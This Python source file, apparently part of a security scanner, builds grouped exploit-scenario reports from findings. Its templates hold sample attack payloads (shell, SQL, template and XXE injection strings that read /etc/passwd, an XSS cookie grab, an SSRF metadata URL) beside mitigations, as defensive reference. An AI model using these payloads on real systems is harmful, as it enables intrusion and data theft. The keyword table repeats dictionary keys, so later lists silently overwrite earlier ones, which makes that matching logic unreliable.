    narrative += "Manual review recommended to assess exploitability and impact."
    
    scenario = models.ExploitScenario(
        report_id=report.id,
        finding_id=findings[0].id,
        severity=highest_severity,
        title=title,
        narrative=narrative,
        preconditions="Review access requirements and attack surface.",
        impact=f"Severity: {highest_severity}. Affected files: {files_str}",
        poc_outline="Manual security testing recommended based on finding type.",
        mitigation_notes="Apply secure coding practices. Consult documentation for specific remediation guidance.",
    )
    db.add(scenario)
    return scenario


async def _generate_individual_scenarios(
    db: Session,
    report: models.Report,
    findings: List[models.Finding],
    use_llm: bool = False
) -> List[models.ExploitScenario]:
    """
    Generate exploit scenarios GROUPED BY VULNERABILITY CATEGORY.
    Creates only ONE scenario per category to avoid duplicates.
    """
    scenarios: List[models.ExploitScenario] = []
    llm_calls_made = 0
    
    # Define category groupings - map template keys to broader categories
    CATEGORY_GROUPS = {
        # Code Injection (group eval, exec, shell together)
        "code_injection": {
            "keys": ["eval", "exec", "shell=true", "template", "gosec_subprocess"],
            "title": "Code Injection Vulnerabilities",
            "narrative": "Multiple code injection vectors found allowing arbitrary code execution. These include eval(), exec(), shell command injection, and template injection.",
            "preconditions": "Attacker must control input that flows to code execution functions",
            "impact": "Full code execution in application context, potential server compromise, lateral movement",
            "poc_outline": "1. Identify user input reaching eval()/exec()/shell\n2. Inject payload: __import__('os').system('whoami')\n3. For shell: inject '; cat /etc/passwd'\n4. For SSTI: {{7*7}} or ${T(java.lang.Runtime).exec('id')}",
            "mitigation": "Remove eval()/exec() entirely. Use shell=False with argument lists. Never render user input in templates.",
        },
        # Secrets (group password, secret, api keys, hardcoded keys)
        "secrets": {
            "keys": ["secret", "password", "hardcoded_key", "jwt"],
            "title": "Hardcoded Credentials & Secrets",
            "narrative": "Credentials, API keys, tokens, and cryptographic keys are embedded in source code. These can be extracted by anyone with repository access.",
            "preconditions": "Access to source code or git history",
            "impact": "Unauthorized access to systems/services, data breach, privilege escalation, financial loss",
            "poc_outline": "1. Search code: grep -r 'password\\|secret\\|api_key\\|token'\n2. Check git history: git log -p | grep -i password\n3. For JWT: decode token, try algorithm=none attack\n4. Use extracted credentials to access services",
            "mitigation": "Use environment variables or secret management (Vault, AWS Secrets Manager). Rotate all exposed credentials immediately.",
        },
        # SQL/NoSQL Injection
        "injection_db": {
            "keys": ["sql", "nosql", "ldap"],
            "title": "Database Injection Vulnerabilities", 
            "narrative": "Injection vulnerabilities in database queries (SQL, NoSQL, LDAP) allow attackers to manipulate query logic, extract data, or bypass authentication.",
            "preconditions": "User input directly embedded in query string",
            "impact": "Data breach, authentication bypass, data manipulation, potential RCE",
            "poc_outline": "1. SQL: ' OR '1'='1' --\n2. NoSQL: {\"$ne\": null}\n3. LDAP: *)(uid=*))(|(uid=*\n4. Extract or bypass authentication",
            "mitigation": "Use parameterized queries, ORM, or query builders. Never concatenate user input into queries.",
        },
        # XSS and Client-Side
        "client_side": {
            "keys": ["xss", "csrf", "clickjacking", "open_redirect", "prototype"],
            "title": "Client-Side Vulnerabilities",
            "narrative": "Client-side vulnerabilities including XSS, CSRF, clickjacking, and open redirects that target application users.",
            "preconditions": "User interaction or victim visiting malicious page",
            "impact": "Session hijacking, credential theft, unauthorized actions, phishing",
            "poc_outline": "1. XSS: <script>alert(document.cookie)</script>\n2. CSRF: Create form auto-submitting to target\n3. Open redirect: ?url=https://evil.com\n4. Clickjacking: iframe with overlay",
            "mitigation": "HTML-encode output. Implement CSRF tokens. Set X-Frame-Options. Validate redirect URLs.",
        },
        # SSRF and Network
        "network": {
            "keys": ["ssrf", "cors", "insecure_tls", "header_injection"],
            "title": "Network & Request Vulnerabilities",
            "narrative": "Server-side request forgery, insecure CORS, TLS issues, and header injection enabling access to internal resources or traffic interception.",
            "preconditions": "User input controls URLs or headers in server requests",
            "impact": "Access internal services, cloud credential theft, man-in-the-middle attacks",
            "poc_outline": "1. SSRF: http://169.254.169.254/latest/meta-data/\n2. Internal: http://localhost:8080/admin\n3. Header injection: inject CRLF sequences",
            "mitigation": "Whitelist allowed domains. Require TLS 1.2+. Validate all header values.",
        },
        # Path/File Operations
        "file_ops": {
            "keys": ["path_traversal", "file_upload", "symlink", "directory_listing"],
            "title": "File Operation Vulnerabilities",
            "narrative": "Path traversal, unrestricted file upload, and symlink attacks enabling unauthorized file access or code execution.",
            "preconditions": "User input used in file operations",
            "impact": "Read sensitive files, write malicious files, achieve RCE via webshell",
            "poc_outline": "1. Path traversal: ../../../etc/passwd\n2. File upload: upload .php/.jsp webshell\n3. Symlink: create symlink to sensitive file",
            "mitigation": "Validate paths against whitelist. Validate uploaded file types server-side. Don't follow symlinks.",
        },
        # Crypto weaknesses
        "crypto": {
            "keys": ["md5", "sha1", "rand", "weak_cipher", "gosec_crypto"],
            "title": "Weak Cryptography",
            "narrative": "Use of broken cryptographic algorithms (MD5, SHA1, DES, RC4) or weak random number generation enabling attacks on data confidentiality and integrity.",
            "preconditions": "Application uses weak crypto for security-sensitive operations",
            "impact": "Password cracking, hash collisions, token prediction, traffic decryption",
            "poc_outline": "1. MD5/SHA1: Use rainbow tables or hashcat\n2. Weak RNG: Analyze and predict generated values\n3. Weak cipher: Apply known cryptanalytic attacks",
            "mitigation": "Use bcrypt/argon2 for passwords. SHA-256+ for integrity. AES-GCM for encryption. secrets module for random.",
        },
        # Deserialization
        "deserial": {
            "keys": ["deserialization"],
            "title": "Insecure Deserialization",
            "narrative": "Deserializing untrusted data can lead to remote code execution. Python pickle, Java ObjectInputStream, PHP unserialize, and YAML are common vectors.",
            "preconditions": "Application deserializes user-controlled data",
            "impact": "Remote code execution, denial of service, authentication bypass",
            "poc_outline": "1. Identify deserialization entry point\n2. Craft malicious payload (ysoserial for Java, pickle exploit for Python)\n3. Send payload and achieve code execution",
            "mitigation": "Avoid deserializing untrusted data. Use safe formats (JSON). Implement integrity checks.",
        },
        # XXE and XML
        "xml": {
            "keys": ["xxe", "java_xxe"],
            "title": "XML Processing Vulnerabilities",
            "narrative": "XML parsers with external entity processing enabled can be exploited to read local files, perform SSRF, or cause denial of service.",
            "preconditions": "Application parses XML with external entity processing enabled",
            "impact": "File disclosure, SSRF, denial of service, potential RCE",
            "poc_outline": "1. Submit: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>\n2. Reference &xxe; in document\n3. For blind XXE: use out-of-band channels",
            "mitigation": "Disable DTDs and external entities. Use defusedxml (Python), XMLConstants.FEATURE_SECURE_PROCESSING (Java).",
        },
        # Memory Safety (C/C++)
        "memory": {
            "keys": ["buffer", "format", "use_after_free", "double_free", "null", "integer_overflow", "uninitialized"],
            "title": "Memory Safety Vulnerabilities",
            "narrative": "Memory corruption vulnerabilities including buffer overflows, use-after-free, format strings, and integer overflows in native code.",
            "preconditions": "Application written in C/C++ processes untrusted input",
            "impact": "Remote code execution, denial of service, information disclosure",
            "poc_outline": "1. Buffer overflow: send oversized input\n2. Format string: inject %x%x%n\n3. Use-after-free: trigger reallocation\n4. Integer overflow: provide MAX_INT values",
            "mitigation": "Use safe functions (strncpy, snprintf). Enable ASLR/stack canaries. Use memory sanitizers. Consider memory-safe languages.",
        },
        # Authentication/Session
        "auth": {
            "keys": ["auth_bypass", "session"],
            "title": "Authentication & Session Issues",
            "narrative": "Authentication bypass, weak session management, and access control vulnerabilities allowing unauthorized access.",
            "preconditions": "Application has authentication/session handling flaws",
            "impact": "Unauthorized access, account takeover, privilege escalation",
            "poc_outline": "1. Test for missing auth on endpoints\n2. Analyze session token entropy\n3. Check for session fixation\n4. Test privilege escalation",
            "mitigation": "Implement proper authentication. Use established frameworks. Regenerate sessions on auth. Set secure cookie flags.",
        },
        # DoS
        "dos": {
            "keys": ["regex", "resource_exhaustion", "zip_bomb", "race_condition"],
            "title": "Denial of Service Vulnerabilities",
            "narrative": "Resource exhaustion, ReDoS, zip bombs, and race conditions that can cause service unavailability.",
            "preconditions": "Application processes unbounded user input",
            "impact": "Service unavailability, resource exhaustion",
            "poc_outline": "1. ReDoS: craft exponential regex input\n2. Zip bomb: upload nested compressed file\n3. Race condition: rapid concurrent requests",
            "mitigation": "Implement rate limiting. Set resource limits. Use timeouts. Validate input sizes. Use atomic operations.",
        },
        # Information Disclosure
        "info_leak": {
            "keys": ["info_disclosure", "log_injection"],
            "title": "Information Disclosure",
            "narrative": "Exposure of sensitive information through error messages, logs, debug output, or improper access controls.",
            "preconditions": "Application reveals sensitive information",
            "impact": "Data breach, aids further attacks, compliance violations",
            "poc_outline": "1. Trigger error conditions\n2. Check for stack traces, paths, versions\n3. Inject into logs to forge entries",
            "mitigation": "Use generic error messages. Disable debug in production. Sanitize log inputs.",
        },
        # Java-specific
        "java": {
            "keys": ["java_injection"],
            "title": "Java-Specific Vulnerabilities",
            "narrative": "Java-specific issues including EL injection, OGNL injection, and expression language vulnerabilities.",
            "preconditions": "Java application evaluates user-controlled expressions",
            "impact": "Remote code execution, data access",
            "poc_outline": "1. EL injection: ${T(java.lang.Runtime).exec('id')}\n2. OGNL: (#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))",
            "mitigation": "Disable expression evaluation on user data. Sanitize inputs. Use latest framework versions.",
        },
    }
    
    # Group findings by category
    category_findings: dict[str, List[models.Finding]] = {}
    uncategorized: List[models.Finding] = []
    
    for finding in findings:
        template_key = _get_template_key_for_finding(finding)
        if template_key:
            # Find which category this template key belongs to
            found_category = None
            for cat_name, cat_info in CATEGORY_GROUPS.items():
                if template_key in cat_info["keys"]:
                    found_category = cat_name
                    break
            
            if found_category:
                if found_category not in category_findings:
                    category_findings[found_category] = []
                category_findings[found_category].append(finding)
            else:
                # Template exists but not in a category group - use template directly
                if template_key not in category_findings:
                    category_findings[template_key] = []
                category_findings[template_key].append(finding)
        else:
            uncategorized.append(finding)
    
    # Create ONE scenario per category
    for cat_key, cat_findings in category_findings.items():
        if cat_key in CATEGORY_GROUPS:
            cat_info = CATEGORY_GROUPS[cat_key]
            title = cat_info["title"]
            narrative = cat_info["narrative"]
            preconditions = cat_info["preconditions"]
            impact = cat_info["impact"]
            poc_outline = cat_info["poc_outline"]
            mitigation = cat_info["mitigation"]
        else:
            # Use individual template
            template = EXPLOIT_TEMPLATES.get(cat_key, {})
            title = template.get("title", f"Security Issue: {cat_key}")
            narrative = template.get("narrative", "Security vulnerability requiring review.")
            preconditions = template.get("preconditions", "Review access requirements.")
            impact = template.get("impact", "Impact depends on context.")
            poc_outline = template.get("poc_outline", "Manual testing recommended.")
            mitigation = template.get("mitigation", "Apply secure coding practices.")
        
        # Find highest severity
        severities = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        highest_severity = max(cat_findings, key=lambda f: severities.get(f.severity, 0)).severity
        
        # List affected files
        all_files = list(set(f.file_path for f in cat_findings))
        files_str = ", ".join(all_files[:5])
        if len(all_files) > 5:
            files_str += f" (+{len(all_files) - 5} more)"
        
        # Add instance count to narrative
        if len(cat_findings) > 1:
            narrative = f"**{len(cat_findings)} instances found** across the codebase.\n\n{narrative}"
        
        # Get POC scripts for this category
        poc_scripts = _get_poc_scripts_for_category(cat_key, cat_findings[0].file_path if cat_findings else None)
        
        # Determine attack complexity
        attack_complexity = _assess_attack_complexity(cat_key, cat_findings)
        
        scenario = models.ExploitScenario(
            report_id=report.id,
            finding_id=cat_findings[0].id,
            severity=highest_severity,
            title=title,
            narrative=narrative,
            preconditions=preconditions,
            impact=impact + f"\n\nAffected files: {files_str}",
            poc_outline=poc_outline,
            poc_scripts=poc_scripts,
            attack_complexity=attack_complexity,
            exploit_maturity=_get_exploit_maturity(cat_key),
            mitigation_notes=mitigation,
        )
        db.add(scenario)
        scenarios.append(scenario)
    
    # Handle uncategorized findings with multi-level catch-all grouping
    if uncategorized:
        # LEVEL 1: Try to group by rule_id from details (most specific)
        rule_groups: dict[str, List[models.Finding]] = {}
        still_uncategorized: List[models.Finding] = []
        
        for finding in uncategorized:
            rule_id = _extract_rule_id(finding)
            if rule_id:
                if rule_id not in rule_groups:
                    rule_groups[rule_id] = []
                rule_groups[rule_id].append(finding)
            else:
                still_uncategorized.append(finding)
        
        # LEVEL 2: Group remaining by finding.type (scanner type like 'sast', 'secret', etc.)
        type_groups: dict[str, List[models.Finding]] = {}
        final_uncategorized: List[models.Finding] = []
        
        for finding in still_uncategorized:
            if finding.type:
                type_key = finding.type.lower().strip()
                if type_key not in type_groups:
                    type_groups[type_key] = []
                type_groups[type_key].append(finding)
            else:
                final_uncategorized.append(finding)
        
        # LEVEL 3: Final catch-all - group remaining by keyword category
        keyword_groups: dict[str, List[models.Finding]] = {}
        for finding in final_uncategorized:
            cat = _categorize_finding(finding)
            if cat not in keyword_groups:
                keyword_groups[cat] = []
            keyword_groups[cat].append(finding)
        
        # Create scenarios for rule-based groups
        for rule_id, rule_findings in rule_groups.items():
            scenario = _create_catchall_scenario(
                db, report, rule_findings, 
                title=f"Security Issue: {_format_rule_title(rule_id)}",
                use_llm=use_llm and llm_calls_made < MAX_FINDINGS_FOR_LLM
            )
            if scenario:
                scenarios.append(scenario)
                if use_llm and llm_calls_made < MAX_FINDINGS_FOR_LLM:
                    llm_calls_made += 1
        
        # Create scenarios for type-based groups
        for type_name, type_findings in type_groups.items():
            scenario = _create_catchall_scenario(
                db, report, type_findings,
                title=f"{_format_type_title(type_name)} Issues",
                use_llm=use_llm and llm_calls_made < MAX_FINDINGS_FOR_LLM
            )
            if scenario:
                scenarios.append(scenario)
                if use_llm and llm_calls_made < MAX_FINDINGS_FOR_LLM:
                    llm_calls_made += 1
        
        # Create scenarios for keyword-based groups
        for cat_name, cat_findings in keyword_groups.items():
            scenario = _create_catchall_scenario(
                db, report, cat_findings,
                title=cat_name,
                use_llm=use_llm and llm_calls_made < MAX_FINDINGS_FOR_LLM
            )
            if scenario:
                scenarios.append(scenario)
                if use_llm and llm_calls_made < MAX_FINDINGS_FOR_LLM:
                    llm_calls_made += 1
    
    logger.info(f"Generated {len(scenarios)} grouped exploit scenarios ({llm_calls_made} LLM calls)")
    return scenarios


def _get_template_key_for_finding(finding: models.Finding) -> Optional[str]:
    """Get the template key (not title) for a finding."""
    summary_lower = finding.summary.lower()
    details_str = str(finding.details).lower() if finding.details else ""
    finding_type = (finding.type or "").lower()
    combined = summary_lower + " " + details_str + " " + finding_type
    
    # Check each template key
    for key in EXPLOIT_TEMPLATES.keys():
        if key in combined:
            return key
    
    # Comprehensive pattern matching for all scanners and vulnerability types
    patterns = {
        # === INJECTION VULNERABILITIES ===
        "sql": [
            "sql injection", "sqli", "query injection", "b608", 
            "sql_injection", "cwe-89", "execute(", "executemany(",
            "cursor.execute", "raw(", ".extra(", ".raw(",
            "sql_injection_hibernate", "sql_injection_jpa", "sql_injection_jdbc",
        ],
        "xss": [
            "cross-site scripting", "xss", "script injection", "reflected", "b320",
            "xss_servlet", "xss_jsp", "cwe-79", "mark_safe", "safestring", 
            "|safe", "dangerouslysetinnerhtml", "v-html", "innerhtml",
            "xss_request_wrapper", "no-unsanitized",
        ],
        "eval": [
            "eval(", "evaluate", "code injection", "b307",
            "detect-eval-with-expression", "no-eval", "no-implied-eval",
            "new function(", "setinterval(", "settimeout(",
        ],
        "exec": [
            "exec(", "system(", "popen(", "command injection", "os.system",
            "subprocess", "b602", "b603", "b604", "b605", "b606", "b607",
            "command_injection", "cwe-78", "os.popen", "commands.",
            "detect-child-process", "child_process", "spawn(", "execfile",
            "g204",  # gosec subprocess
        ],
        "shell=true": ["shell=true", "shell injection", "b604", "shell=1"],
        "template": [
            "template injection", "ssti", "jinja", "twig", "freemarker",
            "server-side template", "mako", "velocity", "thymeleaf",
        ],
        "ldap": ["ldap injection", "ldap_injection", "cwe-90"],
        "nosql": ["nosql injection", "mongodb injection", "$where", "$gt", "$ne"],
        "header_injection": ["header injection", "crlf", "response splitting", "http splitting"],
        "log_injection": ["log injection", "log forging", "log4j", "log4shell", "jndi"],
        
        # === AUTHENTICATION & SESSION ===
        "password": [
            "password", "credential", "hardcoded", "passwd", "b105", "b106", "b107",
            "default password", "weak password",
        ],
        "secret": [
            "api_key", "apikey", "secret", "token", "private_key", "b104",
            "aws_access_key", "aws_secret", "github_token", "slack_token",
            "stripe", "bearer", "authorization", "g101",  # gosec hardcoded
        ],
        "jwt": ["jwt", "json web token", "algorithm confusion", "none algorithm", "hs256", "rs256"],
        "session": ["session fixation", "session hijack", "session management", "cookie"],
        "auth_bypass": ["authentication bypass", "auth bypass", "broken auth", "missing auth"],
        "csrf": ["csrf", "cross-site request forgery", "no csrf", "missing csrf"],
        
        # === FILE & PATH VULNERABILITIES ===
        "path_traversal": [
            "path traversal", "directory traversal", "../", "lfi", "rfi", "b108",
            "path_traversal_in", "path_traversal_out", "cwe-22", "..\\",
            "detect-non-literal-fs-filename",
        ],
        "file_upload": ["file upload", "unrestricted upload", "webshell", "upload validation"],
        "symlink": ["symlink", "symbolic link", "link following", "toctou"],
        "directory_listing": ["directory listing", "directory browsing", "index of"],
        
        # === XML VULNERABILITIES ===
        "xxe": [
            "xxe", "xml external", "external entity", "b313", "b314", "b318", "b319", "b320",
            "xxe_saxparser", "xxe_document", "xxe_xmlreader", "cwe-611",
            "doctype", "entity", "dtd",
        ],
        
        # === NETWORK VULNERABILITIES ===
        "ssrf": [
            "ssrf", "server-side request", "request forgery", "b310",
            "url validation", "open url", "169.254.169.254",
        ],
        "open_redirect": ["open redirect", "redirect", "unvalidated redirect", "url redirect"],
        "cors": ["cors", "cross-origin", "access-control-allow", "origin validation"],
        "insecure_tls": [
            "tls", "ssl", "sslv3", "tls 1.0", "weak cipher", "certificate",
            "weak_trust_manager", "weak_hostname_verifier", "cwe-295",
        ],
        
        # === CRYPTOGRAPHY ===
        "md5": ["md5", "weak hash", "b303", "b324", "weak_message_digest_md5", "cwe-327"],
        "sha1": ["sha1", "sha-1", "b303", "weak_message_digest_sha1"],
        "rand": [
            "random", "rand()", "math.random", "insecure random", "pseudo-random", "b311",
            "cert-msc30-c", "cert-msc32-c", "cert-msc50-cpp", "detect-pseudorandombytes",
            "g404",  # gosec weak random
        ],
        "weak_cipher": ["des", "rc4", "ecb mode", "weak encryption", "blowfish", "3des"],
        "hardcoded_key": ["hardcoded key", "encryption key", "aes key", "private key embedded"],
        
        # === DESERIALIZATION ===
        "deserialization": [
            "deserialize", "unpickle", "unserialize", "yaml.load", "b301", "b506",
            "pickle.load", "cpickle", "shelve", "marshal.load", "yaml.unsafe",
            "object_deserialization", "java.io.objectinputstream", "readobject",
            "ysoserial", "gadget chain",
        ],
        
        # === MEMORY SAFETY (C/C++) ===
        "buffer": [
            "buffer overflow", "stack overflow", "heap overflow", "out of bounds",
            "cwe-120", "cwe-122", "cwe-131", "gets(", "strcpy", "strcat",
            "sprintf", "scanf", "memcpy", "array-bounds", "stack-buffer",
        ],
        "format": [
            "format string", "printf", "sprintf", "fprintf", "cwe-134",
            "format-security", "%n", "user-controlled format",
        ],
        "use_after_free": [
            "use-after-free", "use after free", "uaf", "cwe-416",
            "bugprone-use-after-move", "dangling pointer",
        ],
        "double_free": ["double-free", "double free", "cwe-415"],
        "null": [
            "null pointer", "nullptr", "null dereference", "nullderef", "cwe-476",
            "null-dereference", "npe",
        ],
        "integer_overflow": [
            "integer overflow", "integer underflow", "int overflow", "cwe-190",
            "bugprone-integer-division", "wraparound",
        ],
        "uninitialized": [
            "uninitialized", "uninit", "cwe-457", "uninitialized-memory",
            "maybe-uninitialized",
        ],
        "race_condition": [
            "race condition", "toctou", "time-of-check", "cwe-362",
            "data race", "concurrent", "threading",
        ],
        
        # === DENIAL OF SERVICE ===
        "regex": [
            "redos", "regex dos", "catastrophic backtracking", "detect-unsafe-regex",
            "exponential regex", "regular expression dos",
        ],
        "resource_exhaustion": [
            "resource exhaustion", "dos", "denial of service", "memory exhaustion",
            "cpu exhaustion", "infinite loop", "bugprone-infinite-loop",
        ],
        "zip_bomb": ["zip bomb", "decompression bomb", "zip slip", "archive"],
        
        # === INFORMATION DISCLOSURE ===
        "info_disclosure": [
            "information disclosure", "info leak", "sensitive data", "stack trace",
            "debug", "verbose error", "exception", "cwe-200",
        ],
        
        # === UI SECURITY ===
        "clickjacking": ["clickjacking", "x-frame-options", "frame-ancestors", "ui redress"],
        "prototype": ["prototype pollution", "__proto__", "constructor.prototype"],
        
        # === SCANNER-SPECIFIC RULE IDs ===
        # Bandit (Python) - B1xx to B7xx
        "secret": ["b100", "b101", "b102", "b103", "b104", "b105", "b106", "b107", "b108"],
        "exec": ["b601", "b602", "b603", "b604", "b605", "b606", "b607", "b609", "b610"],
        "deserialization": ["b301", "b302", "b303", "b304", "b305", "b306", "b307", "b308"],
        "xxe": ["b313", "b314", "b315", "b316", "b317", "b318", "b319", "b320", "b321"],
        "rand": ["b311", "b312"],
        "sql": ["b608"],
        "ssrf": ["b310"],
        
        # Gosec (Go) - G1xx to G6xx
        "gosec_subprocess": ["g201", "g202", "g203", "g204"],
        "gosec_crypto": ["g401", "g402", "g403", "g404", "g405", "g406"],
        "sql": ["g201", "g202"],
        "path_traversal": ["g304", "g305"],
        "xxe": ["g303"],
        
        # SpotBugs (Java)
        "java_injection": ["el_injection", "ognl_injection", "seam_log_injection"],
        "java_xxe": ["xxe_saxparser", "xxe_document", "xxe_xmlreader", "xxe_xpathexpr"],
        
        # ESLint (JavaScript)
        "eval": ["detect-eval", "no-eval", "no-implied-eval", "no-new-func"],
        "exec": ["detect-child-process", "child_process"],
        "path_traversal": ["detect-non-literal-fs-filename"],
        "regex": ["detect-unsafe-regex"],
        "prototype": ["detect-object-injection"],
        
        # Clang-Tidy (C/C++) - cert-*, bugprone-*
        "buffer": [
            "cert-str34-c", "bugprone-not-null-terminated-result",
            "bugprone-sizeof-container", "bugprone-sizeof-expression",
        ],
        "rand": ["cert-msc30-c", "cert-msc32-c", "cert-msc50-cpp", "cert-msc51-cpp"],
        "use_after_free": ["bugprone-use-after-move"],
        "race_condition": ["cert-con36-c", "cert-con37-c"],
    }
    
    for key, keywords in patterns.items():
        for keyword in keywords:
            if keyword in combined:
                return key
    
    # Check finding type as fallback
    if finding.type == "secret":
        return "secret"
    if finding.type == "sast":
        return None  # Let it fall through to catch-all
    
    return None
